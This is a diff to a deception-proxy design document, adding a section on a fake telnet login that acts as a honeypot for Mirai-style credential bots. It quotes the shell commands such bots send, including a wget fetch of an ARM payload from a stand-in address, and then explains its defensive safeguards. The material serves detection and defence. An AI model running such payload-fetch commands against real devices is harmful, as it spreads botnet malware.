@@ -42,6 +42,7 @@ exist.
 - [A MySQL that is not there](#a-mysql-that-is-not-there)
 - [A PostgreSQL that is not there](#a-postgresql-that-is-not-there)
 - [A resolver that is not there](#a-resolver-that-is-not-there)
+- [A login that is not there](#a-login-that-is-not-there)
 - [Refusal at the TLS handshake](#refusal-at-the-tls-handshake)
 - [What it produces](#what-it-produces)
 - [Building it out](#building-it-out)
@@ -91,6 +92,7 @@ Two consequences worth stating plainly:
 | Fabricated cache | `redis.deception` | The whole exploit chain, answered -- and its directory, file name and payload in your log | The same, plus a value read back that was never stored | None, as above |
 | Fabricated database | `mysql.deception`, `postgres.deception` | The reconnaissance, answered consistently -- and which escalation it was for: a web shell, a key off the server, a file off the *client*, or, on PostgreSQL, a shell command the manual documents | The same, plus an empty result set where a real query needed rows | None, as above |
 | Fabricated resolver | `dns.deception` | The refusal it was reading, and the rest of what was leaving: a tunnel told NXDOMAIN moves channel, one that is answered keeps sending | A fabricated answer aimed at a real host, if the pool names one; an amplifier, if the bound were not there | None: it answers only where a refusal would be |
+| Fabricated login | `telnet.deception` | The dictionary it is walking, and then the payload: the address it fetches from, the architecture it built for | A real operator handed a fabricated device during an outage -- which is why it never replaces one | None: it answers only where a refusal would be |
 | Handshake refusal | `handshake` | A key exchange it does not get to spend | A client refused with no log line to explain it | Only what the ban list holds |
 
 ## How the signals chain
@@ -1021,6 +1023,85 @@ every time. The fingerprint names — `version.bind`, `hostname.bind`, `id.serve
 — trip and are never answered, for the reason the S7 section gives about the
 system status list: a service that names itself has handed over the list of what
 it is vulnerable to.
+
+## A login that is not there
+
+Everything above answers a *protocol*. This one answers a person, or more often a
+program pretending to be one, and the thing it collects is not a reply but a list.
+
+A telnet port on a public address is found within the hour. What finds it is a
+dictionary: the Mirai family and everything written after it walk a list of the
+credentials that shipped on recorders, cameras and routers -- a few thousand pairs,
+tried a handful at a time from a great many addresses so that no one of them looks
+like an attack.
+
+Refusing collects the address, which the firewall log already had. Answering
+collects the list, and then the part that matters:
+
+```
+enable / system / shell / sh          is this a shell
+/bin/busybox MIRAI                    is it busybox, and which one
+echo -e '\x6b\x61\x6d\x69'            is anything actually reading this
+cat /proc/cpuinfo                     which payload do I need
+wget http://198.51.100.9/bins/x.arm7  and here is where it lives
+```
+
+That last line names the payload, the address serving it and the architecture it
+was built for. Nothing else in this proxy produces it, and it arrives four
+exchanges after a login that a refusal would have ended.
+
+```yaml
+# A honeypot on the plant network: a recorder that is not there.
+- name: legacy-spare
+  address: "10.70.0.23:23"
+  kind: telnet
+  telnet:
+    deception:
+      mode: decoy
+      profile: busybox
+      hostname: cam-07      # something this estate really has
+      attempts: 2           # what a real device's login looks like
+```
+
+**The rule is the same one.** On a listener that fronts real equipment
+(`mode: answer`) the fabrication sits where a refusal would be written -- a failed
+second factor, the authorisation policy, a missing grant -- and nowhere else. It
+does not replace `allow_clients` or a ban, because an address that may not connect
+gets nothing. And it never replaces an **outage**: an operator working an incident
+who cannot reach the equipment must be told that, not handed a device that is not
+there. That is the one place in this whole document where answering would cost more
+than refusing.
+
+**The login never turns on the credential.** Every credential is accepted once the
+configured number of attempts has been taken, and which one it was makes no
+difference to what follows. A trap that accepted the right password and refused the
+wrong one would be a credential oracle, which is the one thing a password list
+needs -- the same reason the fabricated Redis accepts every `AUTH`.
+
+**No password is kept, in any form a guess can be tested against.** This is the
+section where that rule is hardest and matters most, because here the credential
+*is* the intelligence. What is kept is the user name, the credential's length, and
+a handle computed under a key the process made at startup from the system random
+source and never writes down. That answers the operator's real question -- how many
+distinct passwords did this client try, and have we seen this one before -- and
+answers nothing at all to whoever reads the log later. After a restart the handles
+are new, which is correct: the question was about a campaign, not about a password.
+A process with no random source produces no handle rather than one under a constant
+key. And the recording, where one is configured, holds the shell transcript and not
+the login.
+
+**Nothing is run and nothing is fetched.** `wget` and its family answer the
+connection timeout a device behind a firewall answers -- after the address has been
+written down. A fabrication that fetched the payload would be performing the
+download on the attacker's behalf, from this estate's address, with this estate's
+reputation, and would turn a sensor into a participant.
+
+**And it invents no credentials.** `/etc/shadow` lists the accounts with `*` where
+a hash would be: a fabricated hash is a machine's worth of somebody's time spent on
+nothing, and a thing an operator could later mistake for real. `/tmp` is empty and
+so is the shell history, for the reason the Modbus section gives about not
+inventing a consequence it cannot maintain -- a fabricated history is a fabricated
+person who used this machine.
 
 ## Refusal at the TLS handshake
 
